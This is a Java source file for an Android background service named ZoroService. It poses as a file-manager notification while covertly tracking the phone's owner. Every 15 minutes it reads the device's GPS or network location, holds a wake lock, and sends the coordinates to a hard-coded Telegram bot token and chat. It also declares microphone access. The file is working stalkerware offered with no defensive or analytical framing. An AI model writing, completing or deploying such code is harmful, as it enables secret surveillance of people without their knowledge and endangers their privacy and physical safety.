package com.zoro.app;

import android.app.*;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class ZoroService extends Service {
    static final String CH = "z_ch";
    static final String TOKEN = "8884019475:AAFpnDUBdu24Cv0r52RRwb74JtIXHDytDRU";
    static final String CHAT = "7277975586";
    static final String API = "https://api.telegram.org/bot" + TOKEN;
    static final OkHttpClient http = new OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).build();
    volatile boolean running = true;

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
        Notification n = new NotificationCompat.Builder(this, CH)
            .setContentTitle("مدير الملفات")
            .setContentText("جارٍ العمل")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN).build();
        if (Build.VERSION.SDK_INT >= 30) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(1, n);
        }
        new Thread(this::loop).start();
    }

    void loop() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "z:w");
        wl.acquire();
        try {
            while (running) {
                try {
                    String loc = "غير متاح";
                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                    Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (l != null) loc = "Lat: " + l.getLatitude() + "\nLon: " + l.getLongitude();
                    String t = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                    sendMsg("🔄 تحديث\n" + loc + "\n" + t);
                    Thread.sleep(15 * 60 * 1000L);
                } catch (Exception e) {
                    try { Thread.sleep(60_000); } catch (Exception ignored) {}
                }
            }
        } finally { if (wl.isHeld()) wl.release(); }
    }

    void sendMsg(String text) {
        try {
            RequestBody b = new FormBody.Builder().add("chat_id", CHAT).add("text", text).build();
            http.newCall(new Request.Builder().url(API + "/sendMessage").post(b).build()).execute();
        } catch (Exception ignored) {}
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public void onDestroy() { running = false; super.onDestroy(); }
}
